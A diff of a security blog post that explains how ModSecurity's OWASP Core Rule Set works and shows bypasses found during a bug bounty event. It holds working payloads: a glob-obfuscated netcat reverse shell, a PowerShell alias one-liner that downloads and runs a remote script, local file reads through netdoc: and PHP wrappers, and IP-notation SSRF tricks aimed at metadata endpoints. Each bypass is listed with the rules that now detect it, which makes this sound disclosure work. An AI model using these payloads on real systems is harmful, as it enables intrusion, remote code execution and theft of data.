@@ -6,9 +6,8 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Hola amigos! I&rsquo;m excited to finally share this unfinished blog post from 2023. After some time away, I&rsquo;ve finally gathered the energy to complete and publish this blog.
+<meta name="description" content="Hey everyone! I&rsquo;m so stoked to finally share this blog post that&rsquo;s been sitting in my drafts since 2023. Life got busy and I lost my writing mojo for a bit, but I&rsquo;ve finally gathered enough energy to finish this one up!
 Today&rsquo;s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!
-Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. ModSecurity, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the OWASP CRS (Core Rule Set) Project.
 " />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
@@ -26,7 +25,7 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
 
 
 
-  <link rel="stylesheet" href="https://0xinfection.xyz/main.min.07ea7ac7da67e2e153a7dfa2457bc6a19cca824288d175e223fadc579041bc51.css" integrity="sha256-B&#43;p6x9pn4uFTp9&#43;iRXvGoZzKgkKI0XXiI/rcV5BBvFE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://0xinfection.xyz/main.min.28994c8613b75503acb64df6db99f39cfd1558d9ff2cf3265386b94d7fa3e1ce.css" integrity="sha256-KJlMhhO3VQOstk3225nznP0VWNn/LPMmU4a5TX&#43;j4c4=" crossorigin="anonymous">
 
 
 
@@ -43,29 +42,26 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
 
 
   <meta itemprop="name" content="Breaking the WAF Wall: ModSecurity CRS">
-  <meta itemprop="description" content="Hola amigos! I’m excited to finally share this unfinished blog post from 2023. After some time away, I’ve finally gathered the energy to complete and publish this blog.
-Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!
-Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. ModSecurity, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the OWASP CRS (Core Rule Set) Project.">
+  <meta itemprop="description" content="Hey everyone! I’m so stoked to finally share this blog post that’s been sitting in my drafts since 2023. Life got busy and I lost my writing mojo for a bit, but I’ve finally gathered enough energy to finish this one up!
+Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!">
   <meta itemprop="datePublished" content="2025-08-21T00:00:00+05:30">
   <meta itemprop="dateModified" content="2025-08-21T00:00:00+05:30">
-  <meta itemprop="wordCount" content="2409">
+  <meta itemprop="wordCount" content="2556">
   <meta itemprop="image" content="https://0xinfection.xyz/">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://0xinfection.xyz/">
   <meta name="twitter:title" content="Breaking the WAF Wall: ModSecurity CRS">
-  <meta name="twitter:description" content="Hola amigos! I’m excited to finally share this unfinished blog post from 2023. After some time away, I’ve finally gathered the energy to complete and publish this blog.
-Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!
-Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. ModSecurity, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the OWASP CRS (Core Rule Set) Project.">
+  <meta name="twitter:description" content="Hey everyone! I’m so stoked to finally share this blog post that’s been sitting in my drafts since 2023. Life got busy and I lost my writing mojo for a bit, but I’ve finally gathered enough energy to finish this one up!
+Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!">
 
 
 
     <meta property="og:url" content="https://0xinfection.xyz/posts/breaking-the-waf-wall-modsecurity-crs/">
   <meta property="og:site_name" content="0xInfection&#39;s Blog — Ramblings of an Infected Geek">
   <meta property="og:title" content="Breaking the WAF Wall: ModSecurity CRS">
-  <meta property="og:description" content="Hola amigos! I’m excited to finally share this unfinished blog post from 2023. After some time away, I’ve finally gathered the energy to complete and publish this blog.
-Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!
-Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. ModSecurity, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the OWASP CRS (Core Rule Set) Project.">
+  <meta property="og:description" content="Hey everyone! I’m so stoked to finally share this blog post that’s been sitting in my drafts since 2023. Life got busy and I lost my writing mojo for a bit, but I’ve finally gathered enough energy to finish this one up!
+Today’s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -172,11 +168,28 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
       
 
       <div class="post-content">
-        <p>Hola amigos! I&rsquo;m excited to finally share this unfinished blog post from 2023. After some time away, I&rsquo;ve finally gathered the energy to complete and publish this blog.</p>
+        <p>Hey everyone! I&rsquo;m so stoked to finally share this blog post that&rsquo;s been sitting in my drafts since 2023. Life got busy and I lost my writing mojo for a bit, but I&rsquo;ve finally gathered enough energy to finish this one up!</p>
 <p>Today&rsquo;s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!</p>
-<h2 id="quick-primer-to-wafs">Quick Primer to WAFs</h2>
+<p>We will first cover how CRS works internally, how the rules work and then talk about the bypasses. If you want to directly skip the Bypasses section, <a href="#the-bypasses">click here</a>.</p>
+
+
+
+
+<h2 id="quick-primer-to-wafs">
+  <a href="#quick-primer-to-wafs" class="anchor" aria-label="Anchor link for: Quick Primer to WAFs">
+    Quick Primer to WAFs
+  </a>
+</h2>
 <p>Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. <a href="https://github.com/owasp-modsecurity/ModSecurity">ModSecurity</a>, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the <a href="https://github.com/coreruleset/coreruleset/tree/main/rules">OWASP CRS (Core Rule Set)</a> Project.</p>
-<h3 id="how-does-modsecurity-and-crs-work-together">How does ModSecurity and CRS work together?</h3>
+
+
+
+
+<h3 id="how-does-modsecurity-and-crs-work-together">
+  <a href="#how-does-modsecurity-and-crs-work-together" class="anchor" aria-label="Anchor link for: How does ModSecurity and CRS work together?">
+    How does ModSecurity and CRS work together?
+  </a>
+</h3>
 <p>Before we explore the bypasses in detail, it is important to understand the relationship between ModSecurity and CRS. In essence, ModSecurity serves as the engine that inspects and analyses HTTP requests and responses, while CRS provides the ruleset that matches various attack patterns.</p>
 <p>CRS works in phases when inspecting requests and responses. A high level overview of how CRS works depicted below:</p>
 
@@ -192,19 +205,43 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
 <li><strong>Phase 5</strong>: Logging what was found in the previous phases (for audits, rule tuning, etc.)</li>
 </ul>
 <p>CRS uses <em>Anomaly Scoring</em> to decide whether a request gets through or gets blocked. It also gives you different <em>Paranoia Levels</em> that you can adjust based on how secure you want your setup to be.</p>
-<h4 id="anomaly-scoring">Anomaly Scoring</h4>
+
+
+
+
+<h4 id="anomaly-scoring">
+  <a href="#anomaly-scoring" class="anchor" aria-label="Anchor link for: Anomaly Scoring">
+    Anomaly Scoring
+  </a>
+</h4>
 <p>From <a href="https://coreruleset.org/docs/2-how-crs-works/2-1-anomaly_scoring/">official docs</a>:</p>
 <blockquote>
 <p>Anomaly scoring, also known as “collaborative detection”, is a scoring mechanism used in CRS. It assigns a numeric score to HTTP transactions (requests and responses), representing how ‘anomalous’ they appear to be. Anomaly scores can then be used to make blocking decisions. The default CRS blocking policy, for example, is to block any transaction that meets or exceeds a defined anomaly score threshold.</p></blockquote>
 <p>In short, CRS uses a point-based system called <em>Anomaly Scoring</em> to determine if a request is malicious. Each suspicious pattern adds points to a request&rsquo;s score. If the total score exceeds a threshold, the request gets blocked.</p>
-<h4 id="paranoia-levels">Paranoia Levels</h4>
+
+
+
+
+<h4 id="paranoia-levels">
+  <a href="#paranoia-levels" class="anchor" aria-label="Anchor link for: Paranoia Levels">
+    Paranoia Levels
+  </a>
+</h4>
 <p>From the <a href="https://coreruleset.org/docs/2-how-crs-works/2-2-paranoia_levels/">official docs</a>:</p>
 <blockquote>
 <p>The paranoia level (PL) makes it possible to define how aggressive CRS is.</p>
 <p>A higher paranoia level makes it harder for an attacker to go undetected. Yet this comes at the cost of more false positives: more false alarms. That’s the downside to running a rule set that detects almost everything: your business / service / web application is also disrupted.</p></blockquote>
-<p>To sum it up, <em>Paranoia Levels</em> basically tell you how thoroughly you want the WAF to examine incoming HTTP requests. CRS has 4 paranoia levels, PL1 to PL4, with PL1 giving you basic protection and PL4 being super aggressive.</p>
-<p>The higher you go with paranoia levels, the more rules get turned on and the stricter the filtering gets. While PL4 gives you maximum security, it can really mess with your normal traffic. Most people stick with PL1 or PL2 to keep things balanced.</p>
-<h3 id="rules-in-crs">Rules in CRS</h3>
+<p><em>Paranoia Levels</em> let you define how thoroughly you want the WAF to examine incoming HTTP requests. CRS has 4 paranoia levels, level 1 to 4, with PL1 giving you basic protection and PL4 being super aggressive.</p>
+<p>The higher you crank up those paranoia levels, the more rules get activated and the tighter the filtering becomes. PL4 can be a real pain in the neck even with regular traffic &ndash; it&rsquo;s like having an overzealous bouncer at a club. Most folks stick with PL1 or PL2 to keep things running smoothly without going overboard.</p>
+
+
+
+
+<h3 id="rules-in-crs">
+  <a href="#rules-in-crs" class="anchor" aria-label="Anchor link for: Rules in CRS">
+    Rules in CRS
+  </a>
+</h3>
 <p>Now let&rsquo;s talk about how rules work in CRS.</p>
 <p>Rules within CRS are defined by the <a href="https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual-(v2.x)#SecRule"><code>SecRule</code></a> directive. Each <code>SecRule</code> follows the following structure:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>SecRule {VARIABLES} {OPERATOR} {<span style="color:#e6db74">&#34;ACTIONS&#34;</span>}
@@ -225,7 +262,7 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
 </ul>
 <p><strong>Operator (<code>@rx curl/.*</code>)</strong></p>
 <ul>
-<li>Uses regex matching to match any <code>User-Agent</code> containing <code>curl/{any_version}</code>.</li>
+<li>Uses regular expressions to match any <code>User-Agent</code> containing <code>curl/{any_version}</code>.</li>
 </ul>
 <p><strong>Actions</strong></p>
 <ul>
@@ -235,23 +272,39 @@ Quick Primer to WAFs Web Application Firewalls (WAFs) serve as a crucial securit
 <li>Action (<code>pass</code>): Allows the request to continue processing. No blocking or dropping occurs.</li>
 <li>Action (<code>msg:'Detected curl client'</code>): Adds a custom message describing the detection.</li>
 </ul>
-<h2 id="the-bypasses">The Bypasses</h2>
-<p>Now, lets talk about the bypasses that I crafted. For the bypasses below, I will break down my thought process on how I crafted the bypasses, listing down the steps of crafting a bypass.</p>
-<h3 id="spawning-reverse-shells">Spawning Reverse Shells</h3>
+
+
+
+
+<h2 id="the-bypasses">
+  <a href="#the-bypasses" class="anchor" aria-label="Anchor link for: The Bypasses">
+    The Bypasses
+  </a>
+</h2>
+<p>Now, lets talk about the bypasses. For the bypasses below, I will break down my thought process on how I crafted the bypasses, listing down the steps of crafting a bypass.</p>
+
+
+
+
+<h3 id="spawning-reverse-shells">
+  <a href="#spawning-reverse-shells" class="anchor" aria-label="Anchor link for: Spawning Reverse Shells">
+    Spawning Reverse Shells
+  </a>
+</h3>
 <p>Spawning a reverse shell in *nix systems is pretty straightforward. A simple <code>/bin/nc -e /bin/bash 10.0.0.2 10002</code> will connect back to your pingback server and you&rsquo;ll be able to execute commands on the target machine.
 However, CRS properly detects and blocks the usage of <code>nc</code> (and all other variants).</p>
-<p>This is where bash shell globbing patterns came to rescue. I tried using the following:</p>
+<p>This is where bash shell globbing patterns came to rescue. My first attempt at a bypass looked like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>[abc]<span style="color:#f92672">in</span><span style="color:#f92672">/</span>nc <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash <span style="color:#ae81ff">10.0.0.2</span> <span style="color:#ae81ff">10002</span>
-</span></span></code></pre></div><p>It expands to match:</p>
+</span></span></code></pre></div><p><code>/[abc]in/nc</code> expands to match:</p>
 <ul>
 <li><code>/ain/nc</code></li>
 <li><code>/bin/nc</code> &lt;- Points to our binary</li>
 <li><code>/cin/nc</code></li>
 </ul>
-<p>But that got blocked as well since <code>/bin/bash</code> was also being detected. <code>/bin/zsh</code>, though was not being detected. All other shell variants, e.g. <code>/bin/sh</code>, <code>/bin/fish</code>, <code>/bin/ash</code> etc, were blocked. So I was able to come up with:</p>
+<p>But that got blocked too, turns out <code>/bin/bash</code> was also on their radar. Time to RTFM. I found out that all other shell variants like <code>/bin/sh</code>, <code>/bin/fish</code>, <code>/bin/ash</code> were blacklisted, except for <code>/bin/zsh</code>. So I managed to figure out a workaround with:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>[abc]<span style="color:#f92672">in</span><span style="color:#f92672">/</span>nc <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>zsh <span style="color:#ae81ff">10.0.0.2</span> <span style="color:#ae81ff">10002</span>
-</span></span></code></pre></div><p>However, the pattern was still being blocked because <code>nc -e</code> is a very known syntax for spawning reverse shells. Fiddling around for a way to get around this situation, I figured out that <code>ln</code> (used for linking files) is not blocked.
-The final bypass payload looked similar to this:</p>
+</span></span></code></pre></div><p>But the pattern was still getting blocked as <code>nc -e</code> is pretty much the poster child for reverse shells. After some trial and error, I discovered that <code>ln</code> (the command for linking files) wasn&rsquo;t getting caught.
+Here&rsquo;s what the final bypass payload ended up looking like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ln <span style="color:#f92672">-</span>s <span style="color:#f92672">/[</span>abc<span style="color:#f92672">]</span>in<span style="color:#f92672">/</span>nc <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew; <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>zsh 10.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">2</span> 10002
 </span></span></code></pre></div><p>At the time of publishing the article, a set of 5 rules detect the payload:</p>
 <ul>
@@ -261,20 +314,28 @@ The final bypass payload looked similar to this:</p>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1578"><code>932236</code></a> - Remote Command Execution: Unix Command Injection (command without evasion) (PL2)</li>
 </ul>
-<h3 id="executing-arbitrary-powershell">Executing Arbitrary PowerShell</h3>
-<p>There are specific PowerShell cmdlets allow you to fetch and run remote scripts directly in memory without the payload touching the disk.
-A very common fileless attack technique looks something like the following:</p>
+
+
+
+
+<h3 id="executing-arbitrary-powershell">
+  <a href="#executing-arbitrary-powershell" class="anchor" aria-label="Anchor link for: Executing Arbitrary PowerShell">
+    Executing Arbitrary PowerShell
+  </a>
+</h3>
+<p>PowerShell has some pretty nifty cmdlets that let you grab and execute remote scripts straight in memory - no need for the payload to ever hit the disk. Here&rsquo;s what a typical fileless attack technique looks like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>Expression (Invoke<span style="color:#f92672">-</span>WebRequest http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.0.10.10</span>:<span style="color:#ae81ff">8000</span><span style="color:#f92672">/</span>x<span style="color:#f92672">.</span>ps1)
 </span></span></code></pre></div><p><code>Invoke-WebRequest</code> fetches the <code>x.ps1</code> file from the remote host and <code>Invoke-Expression</code> executes it as PowerShell code.
 As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>Invoke-WebRequest</code>.</p>
 <p>Windows Powershell, however, comes with a set of built-in aliases for a lot of the cmdlets &ndash; most of which ModSecurity did not have in its blacklists.</p>
-<p>That gives us a quick and neat bypass:</p>
+<p>That gives us a neat bypass:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>iex (iwr http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.0</span>.10.<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/x.ps1)
 </span></span></code></pre></div><hr>
-<p>PowerShell can be used to execute binaries on a Windows machine, something similar to <code>powershell.exe C:\windows\system32\notepad.exe</code>, which pops up a notepad. Windows PowerShell does not require the extension to execute, that gives us our second bypass, nothing magical:</p>
+<p>As you probably know, PowerShell can be used to run binaries directly, something like <code>powershell.exe C:\windows\system32\notepad.exe</code> which brings up a notepad. The cool thing is that PowerShell itself doesn&rsquo;t need the <code>.exe</code> extension to work, and that gives us another way to slip past the rules. Nothing fancy, just a simple trick:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>powershell C:<span style="color:#960050;background-color:#1e0010">\</span>wind<span style="color:#f92672">??</span>s<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span>32<span style="color:#960050;background-color:#1e0010">\</span>note<span style="color:#f92672">*</span>.<span style="color:#a6e22e">exe</span>
 </span></span></code></pre></div><p>To break the above payload down:</p>
 <ul>
+<li><code>powershell</code> - Equivalent of <code>powershell.exe</code></li>
 <li><code>?</code> - Matches exactly 1 character</li>
 <li><code>*</code> - Matches 0 or more charcters</li>
 </ul>
@@ -289,8 +350,16 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L214"><code>932120</code></a> - Remote Command Execution: Windows PowerShell Command Found (PL1)</li>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
 </ul>
-<h3 id="accessing-local-files">Accessing Local Files</h3>
-<p>This section of bypasses was more RTFM than hacker magic. CRS blacklists a list of default sensitive files that should not be allowed in HTTP requests.</p>
+
+
+
+
+<h3 id="accessing-local-files">
+  <a href="#accessing-local-files" class="anchor" aria-label="Anchor link for: Accessing Local Files">
+    Accessing Local Files
+  </a>
+</h3>
+<p>This section of bypasses was more source code review than hacker magic. CRS blacklists a list of default sensitive files that should not be allowed in HTTP requests.</p>
 <p>The blacklist for SSH private keys within CRS looked something like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>authorized_keys
 </span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>config
@@ -306,20 +375,40 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>pwquality.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>faillock.conf
 </span></span></code></pre></div><p>These gives us our third bypass.</p>
-<p>This bypass was properly fixed by updates to the <code>lfi-os-files.data</code> which is utilised by rule <a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L90-L118"><code>930120</code></a>.</p>
-<h3 id="abusing-legacy-protocols-and-php-wrappers">Abusing Legacy Protocols and PHP Wrappers</h3>
-<p>A lesser known, legacy Java (&lt;= JDK 8) protocol is <code>netdoc:</code>, which acts similarly to the <code>file:</code> protocol in Java-based XML parsers. CRS appropriately detects most of the protocols like <code>http://</code>, <code>ftp://</code>, <code>file://</code>, etc, but does not filter out <code>netdoc:</code>. This makes it possible to bypass CRS in Java environments (&lt;= JDK 8).</p>
+<p>This bypass was properly fixed by updates to the <code>lfi-os-files.data</code> which is utilised by rule <code>930120</code>.</p>
+<ul>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L90-L118"><code>930120</code></a> - OS File Access Attempt (PL1)</li>
+</ul>
+
+
+
+
+<h3 id="abusing-legacy-protocols-and-php-wrappers">
+  <a href="#abusing-legacy-protocols-and-php-wrappers" class="anchor" aria-label="Anchor link for: Abusing Legacy Protocols and PHP Wrappers">
+    Abusing Legacy Protocols and PHP Wrappers
+  </a>
+</h3>
+<p>A lesser known, legacy Java (&lt;= JDK 8) protocol is <code>netdoc:</code>, which acts similarly to the <code>file:</code> protocol in Java-based XML parsers. CRS appropriately detects usage of most protocols like <code>http://</code>, <code>ftp://</code>, <code>file://</code>, etc, but does not filter out <code>netdoc:</code>. This makes it possible to bypass CRS in Java environments (&lt;= JDK 8).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>netdoc:<span style="color:#f92672">///</span>etc<span style="color:#f92672">/</span>passwd
-</span></span></code></pre></div><p>Combining the above missing files, we can cook something like this:</p>
+</span></span></code></pre></div><p>Now if we put all these missing files together, we can whip up something like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>netdoc:<span style="color:#f92672">///</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>pwquality<span style="color:#f92672">.</span>conf
-</span></span></code></pre></div><p>Missing PHP wrappers also contributed to another bypass, I noticed that <code>compress.zip://</code>, <code>zlib://</code>, <code>glob://</code>, <code>expect://</code>, <code>zip://</code>, etc were blocked, however <code>compress.bzip2://</code> wasn&rsquo;t.</p>
+</span></span></code></pre></div><p>Missing PHP wrappers also contributed to another bypass &ndash; I noticed that <code>compress.zip://</code>, <code>zlib://</code>, <code>glob://</code>, <code>expect://</code>, <code>zip://</code>, etc were blocked, however <code>compress.bzip2://</code> wasn&rsquo;t.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compress<span style="color:#f92672">.</span>bzip2:<span style="color:#f92672">//</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>sensitive<span style="color:#f92672">.</span>bz2
-</span></span></code></pre></div><p>The following 2 rules detect these payloads now:</p>
+</span></span></code></pre></div><p>The following set of rules detect these payloads now:</p>
 <ul>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L119"><code>931130</code></a> - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link (PL2)</li>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L253"><code>933200</code></a> - PHP Injection Attack: Wrapper scheme detected (PL1)</li>
+<li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf#L1816"><code>942460</code></a> - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters</li>
 </ul>
-<h3 id="bypassing-blacklisted-ip-address-notations">Bypassing Blacklisted IP Address Notations</h3>
+
+
+
+
+<h3 id="bypassing-blacklisted-ip-address-notations">
+  <a href="#bypassing-blacklisted-ip-address-notations" class="anchor" aria-label="Anchor link for: Bypassing Blacklisted IP Address Notations">
+    Bypassing Blacklisted IP Address Notations
+  </a>
+</h3>
 <p><strong>SSRF</strong></p>
 <p>The <a href="https://github.com/coreruleset/coreruleset/blob/5eefcce513aa214a1843a5806d55a8f11ba74cca/rules/ssrf.data"><code>ssrf.data</code></a> file contains a list of blacklisted IP address notations intended to prevent Server-Side Request Forgery (SSRF) attempts.</p>
 <p>IP address notations are wild. For example, the following variations all resolve to the same IP address <code>1.0.0.1</code>:</p>
@@ -336,7 +425,7 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 </span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//%</span><span style="color:#ae81ff">31</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">31</span>
 </span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span><span style="color:#ae81ff">1.0</span>x0<span style="color:#ae81ff">.00000000.0</span>x1
 </span></span></code></pre></div><p>If you&rsquo;re bamboozled and scratching your head over how this is possible, I&rsquo;d suggest you to read the <a href="https://linux.die.net/man/3/inet_aton"><code>inet_aton(3)</code></a> manual.</p>
-<p>When an SSRF exploit involves localhost IP addresses, the Core Rule Set (CRS) attempts to block these to prevent exploitation. A simple bypass for the blacklisted <code>127.0.0.1</code> looks like the following:</p>
+<p>When an SSRF exploit involves localhost IP addresses, the Core Rule Set (CRS) attempts to block such requests to prevent exploitation. However, such blacklisted IPs like <code>127.0.0.1</code> can be easily bypassed using alternate notations like:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://127.1
 </span></span></code></pre></div><p>Similarly, the blacklist for Oracle Cloud metadata endpoint (<code>192.0.0.192</code>) can be bypassed using:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://192.192/<span style="color:#f92672">{</span>version<span style="color:#f92672">}</span>/metadata
@@ -355,18 +444,26 @@ As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>In
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L108"><code>931130</code></a> - Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link</li>
 <li><a href="https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf#L90"><code>934110</code></a> - Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter</li>
 </ul>
